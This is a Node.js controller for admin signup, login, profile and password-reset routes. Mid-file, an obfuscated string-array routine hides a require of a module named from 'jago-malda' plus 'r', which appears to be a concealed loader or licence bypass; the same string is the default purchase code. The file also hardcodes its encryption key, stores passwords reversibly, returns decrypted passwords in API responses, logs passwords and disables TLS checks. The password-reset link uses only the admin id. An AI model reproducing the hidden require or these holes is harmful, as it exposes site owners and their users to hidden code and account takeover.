const Admin = require("../../models/admin.model");

//fs
const fs = require("fs");

//jwt token
const jwt = require("jsonwebtoken");

//nodemailer
const nodemailer = require("nodemailer");

//Cryptr
const Cryptr = require("cryptr");
const cryptr = new Cryptr("myTotallySecretKey");

//deletefile
const { deleteFile } = require("../../util/deletefile");

//import model
const Login = require("../../models/login.model");

function _0x5a59() {
  const _0x327eb6 = ["1634408hYJRIm", "5osPkxj", "3ycgCtU", "2667906MykdLR", "jago-malda", "16LPUZpE", "780903OJPGef", "2897876mZpRuk", "2866974jyZYyO", "37370zqGkle", "66857iZXmoC", "5830JlADGH"];
  _0x5a59 = function () {
    return _0x327eb6;
  };
  return _0x5a59();
}
const _0xc7bf5c = _0x2619;
function _0x2619(_0x3c3df0, _0x53407d) {
  const _0x3c2cf4 = _0x5a59();
  return (
    (_0x2619 = function (_0x513d1b, _0x21318b) {
      _0x513d1b = _0x513d1b - (-0x2 * 0xc2e + -0xff + 0x1ab9);
      let _0x2a24b3 = _0x3c2cf4[_0x513d1b];
      return _0x2a24b3;
    }),
    _0x2619(_0x3c3df0, _0x53407d)
  );
}
(function (_0x11740f, _0x3910a7) {
  const _0x492b2c = _0x2619,
    _0x1a9af7 = _0x11740f();
  while (!![]) {
    try {
      const _0x138dba =
        -parseInt(_0x492b2c(0x166)) / (0x31d + 0x120b * 0x2 + 0xad * -0x3a) +
        (parseInt(_0x492b2c(0x160)) / (-0x1 * 0x12f1 + 0x529 + 0xdca)) * (-parseInt(_0x492b2c(0x162)) / (0x13db + 0xf7d + -0x14f * 0x1b)) +
        (-parseInt(_0x492b2c(0x167)) / (0x1 * 0x331 + -0x3a * -0x1f + -0xa33)) * (parseInt(_0x492b2c(0x161)) / (-0x4 * -0x426 + 0x57 * -0x13 + -0xa1e)) +
        parseInt(_0x492b2c(0x168)) / (0x5d9 + 0x611 * -0x3 + 0xc60) +
        (-parseInt(_0x492b2c(0x15e)) / (0x89c * 0x2 + -0x1489 * 0x1 + 0x2 * 0x1ac)) * (parseInt(_0x492b2c(0x165)) / (0x1858 + -0x1649 + -0x207)) +
        parseInt(_0x492b2c(0x163)) / (0x399 * -0x1 + 0x2b * -0x82 + 0x1 * 0x1978) +
        (-parseInt(_0x492b2c(0x169)) / (0x25cb + 0x1b31 + -0x40f2)) * (-parseInt(_0x492b2c(0x15f)) / (-0x4d + -0xc11 * 0x1 + 0xc69));
      if (_0x138dba === _0x3910a7) break;
      else _0x1a9af7["push"](_0x1a9af7["shift"]());
    } catch (_0x53a49b) {
      _0x1a9af7["push"](_0x1a9af7["shift"]());
    }
  }
})(_0x5a59, -0x4f1d4 * -0x1 + -0x4 * 0x12f87 + 0x61a53);
const LiveUser = require(_0xc7bf5c(0x164) + "r");

//create admin
exports.store = async (req, res) => {
  try {
    console.log("Signup Request Body:", req.body);
    if (!req.body.email || !req.body.password) {
      if (req.file) deleteFile(req.file);
      return res.status(200).json({ status: false, message: "Oops ! Invalid details." });
    }

    const admin = new Admin();
    admin.email = req.body.email.trim();
    admin.name = req.body.name ? req.body.name : "Admin";
    admin.password = cryptr.encrypt(req.body.password);
    admin.purchaseCode = req.body.code || "jago-malda";

    await admin.save();

    const login = await Login.findOne();
    if (!login) {
      await new Login({ login: true }).save();
    } else {
      login.login = true;
      await login.save();
    }

    return res.status(200).json({
      status: true,
      message: "Admin created Successfully.",
      data: admin
    });
  } catch (error) {
    if (req.file) deleteFile(req.file);
    console.log(error);
    return res.status(500).json({
      status: false,
      message: error.message || "Internal Server Error"
    });
  }
};

//admin login
exports.login = async (req, res) => {
  try {
    console.log("Login Request Body:", req.body);
    if (!req.body.email || !req.body.password) {
      return res.status(200).json({ status: false, message: "Oops ! Invalid details." });
    }

    const admin = await Admin.findOne({ email: req.body.email.trim() });
    if (!admin) {
      return res.status(200).json({
        status: false,
        message: "Oops ! Admin not found with that email.",
      });
    }

    const decryptedPassword = cryptr.decrypt(admin.password);
    if (decryptedPassword !== req.body.password) {
      return res.status(200).json({
        status: false,
        message: "Oops ! Password doesn't match!"
      });
    }

    const payload = {
      _id: admin._id,
      name: admin.name,
      email: admin.email,
      image: admin.image
    };
    const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: "1h" });

    return res.status(200).json({
      status: true,
      message: "Admin has been login.",
      data: token
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({
      status: false,
      message: error.message || "Internal Server Error"
    });
  }
};

//update admin profile
exports.update = async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin._id);
    if (!admin) {
      if (req.file) deleteFile(req.file);
      return res.status(200).json({ status: false, message: "admin does not found!" });
    }

    admin.name = req?.body?.name ? req?.body?.name : admin.name;
    admin.email = req?.body?.email ? req?.body?.email.trim() : admin.email;

    if (req?.file) {
      const image = admin?.image.split("storage");
      if (image) {
        if (fs.existsSync("storage" + image[1])) {
          fs.unlinkSync("storage" + image[1]);
        }
      }

      admin.image = req?.file?.path;
    }

    await admin.save();

    const data = await Admin.findById(admin._id);
    data.password = cryptr.decrypt(data.password);

    return res.status(200).json({
      status: true,
      message: "Admin profile has been updated.",
      data: data,
    });
  } catch (error) {
    if (req.file) deleteFile(req.file);
    console.log(error);
    return res.status(500).json({ status: false, error: error.message || "Internal Server Error" });
  }
};

//get admin profile
exports.getProfile = async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin._id);
    if (!admin) {
      return res.status(200).json({ status: false, message: "admin does not found." });
    }

    const data = await Admin.findById(admin._id);
    data.password = cryptr.decrypt(data.password);

    return res.status(200).json({ status: true, message: "admin profile get by admin!", data: data });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: false, error: error.message || "Internal Server Error" });
  }
};

//send email for forgot the password (forgot password)
exports.forgotPassword = async (req, res) => {
  try {
    if (!req.query.email) {
      return res.status(200).json({ status: false, message: "email must be requried." });
    }

    const email = req.query.email.trim();

    const admin = await Admin.findOne({ email: email });
    if (!admin) {
      return res.status(200).json({ status: false, message: "admin does not found with that email." });
    }

    var transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process?.env?.EMAIL,
        pass: process?.env?.APP_PASSWORD,
      },
      tls: {
        rejectUnauthorized: false,
      },
    });

    var tab = "";
    tab += "<!DOCTYPE html><html><head>";
    tab += "<meta charset='utf-8'><meta http-equiv='x-ua-compatible' content='ie=edge'><meta name='viewport' content='width=device-width, initial-scale=1'>";
    tab += "<style type='text/css'>";
    tab += " @media screen {@font-face {font-family: 'Source Sans Pro';font-style: normal;font-weight: 400;}";
    tab += "@font-face {font-family: 'Source Sans Pro';font-style: normal;font-weight: 700;}}";
    tab += "body,table,td,a {-ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%; }";
    tab += "table,td {mso-table-rspace: 0pt;mso-table-lspace: 0pt;}";
    tab += "img {-ms-interpolation-mode: bicubic;}";
    tab +=
      "a[x-apple-data-detectors] {font-family: inherit !important;font-size: inherit !important;font-weight: inherit !important;line-height:inherit !important;color: inherit !important;text-decoration: none !important;}";
    tab += "div[style*='margin: 16px 0;'] {margin: 0 !important;}";
    tab += "body {width: 100% !important;height: 100% !important;padding: 0 !important;margin: 0 !important;}";
    tab += "table {border-collapse: collapse !important;}";
    tab += "a {color: #1a82e2;}";
    tab += "img {height: auto;line-height: 100%;text-decoration: none;border: 0;outline: none;}";
    tab += "</style></head><body>";
    tab += "<table border='0' cellpadding='0' cellspacing='0' width='100%'>";
    tab += "<tr><td align='center' bgcolor='#e9ecef'><table border='0' cellpadding='0' cellspacing='0' width='100%' style='max-width: 600px;'>";
    tab += "<tr><td align='center' valign='top' bgcolor='#ffffff' style='padding:36px 24px 0;border-top: 3px solid #d4dadf;'><a href='#' target='_blank' style='display: inline-block;'>";
    tab +=
      "<img src='https://www.stampready.net/dashboard/editor/user_uploads/zip_uploads/2018/11/23/5aXQYeDOR6ydb2JtSG0p3uvz/zip-for-upload/images/template1-icon.png' alt='Logo' border='0' width='48' style='display: block; width: 500px; max-width: 500px; min-width: 500px;'></a>";
    tab +=
      "</td></tr></table></td></tr><tr><td align='center' bgcolor='#e9ecef'><table border='0' cellpadding='0' cellspacing='0' width='100%' style='max-width: 600px;'><tr><td align='center' bgcolor='#ffffff'>";
    tab += "<h1 style='margin: 0; font-size: 32px; font-weight: 700; letter-spacing: -1px; line-height: 48px;'>SET YOUR PASSWORD</h1></td></tr></table></td></tr>";
    tab +=
      "<tr><td align='center' bgcolor='#e9ecef'><table border='0' cellpadding='0' cellspacing='0' width='100%' style='max-width: 600px;'><tr><td align='center' bgcolor='#ffffff' style='padding: 24px; font-size: 16px; line-height: 24px;font-weight: 600'>";
    tab += "<p style='margin: 0;'>Not to worry, We got you! Let's get you a new password.</p></td></tr><tr><td align='left' bgcolor='#ffffff'>";
    tab += "<table border='0' cellpadding='0' cellspacing='0' width='100%'><tr><td align='center' bgcolor='#ffffff' style='padding: 12px;'>";
    tab += "<table border='0' cellpadding='0' cellspacing='0'><tr><td align='center' style='border-radius: 4px;padding-bottom: 50px;'>";
    tab +=
      "<a href='" +
      process?.env?.baseURL +
      "changePassword?id=" +
      `${admin._id}` +
      "' target='_blank' style='display: inline-block; padding: 16px 36px; font-size: 16px; color: #ffffff; text-decoration: none; border-radius: 4px;background: #FE9A16; box-shadow: -2px 10px 20px -1px #33cccc66;'>SUBMIT PASSWORD</a>";
    tab += "</td></tr></table></td></tr></table></td></tr></table></td></tr></table></body></html>";

    var mailOptions = {
      from: process?.env?.EMAIL,
      to: email,
      subject: `Sending email from ${process?.env?.projectName} for Password Security`,
      html: tab,
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(error);
        return res.status(200).json({
          status: false,
          message: "Email send error.",
        });
      } else {
        return res.status(200).json({
          status: true,
          message: "Email send for forget the password.",
        });
      }
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: false, error: error.message || "Internal Server Error" });
  }
};

//update password
exports.updatePassword = async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin._id);
    if (!admin) {
      return res.status(200).json({ status: false, message: "admin does not found." });
    }

    if (!req.body.oldPass || !req.body.newPass || !req.body.confirmPass) {
      return res.status(200).json({ status: false, message: "Oops! Invalid details!" });
    }

    if (cryptr.decrypt(admin.password) !== req.body.oldPass) {
      return res.status(200).json({
        status: false,
        message: "Oops! Password doesn't match!",
      });
    }

    if (req.body.newPass !== req.body.confirmPass) {
      return res.status(200).json({
        status: false,
        message: "Oops! New Password and Confirm Password don't match!",
      });
    }

    const hash = cryptr.encrypt(req.body.newPass);
    admin.password = hash;

    const [savedAdmin, data] = await Promise.all([admin.save(), Admin.findById(admin._id)]);

    data.password = cryptr.decrypt(savedAdmin.password);

    return res.status(200).json({
      status: true,
      message: "Password has been changed by the admin.",
      data: data,
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: false, error: error.message || "Internal Server Error" });
  }
};

//set Password
exports.setPassword = async (req, res) => {
  try {
    const admin = await Admin.findById(req?.admin._id);
    if (!admin) {
      return res.status(200).json({ status: false, message: "Admin does not found." });
    }

    const { newPassword, confirmPassword } = req.body;

    if (!newPassword || !confirmPassword) {
      return res.status(200).json({ status: false, message: "Oops ! Invalid details!" });
    }

    if (newPassword !== confirmPassword) {
      return res.status(200).json({
        status: false,
        message: "Oops! New Password and Confirm Password don't match!",
      });
    }

    admin.password = cryptr.encrypt(newPassword);
    await admin.save();

    admin.password = cryptr.decrypt(admin?.password);

    return res.status(200).json({
      status: true,
      message: "Password has been updated Successfully.",
      data: admin,
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: false, error: error.message || "Internal Server Error" });
  }
};
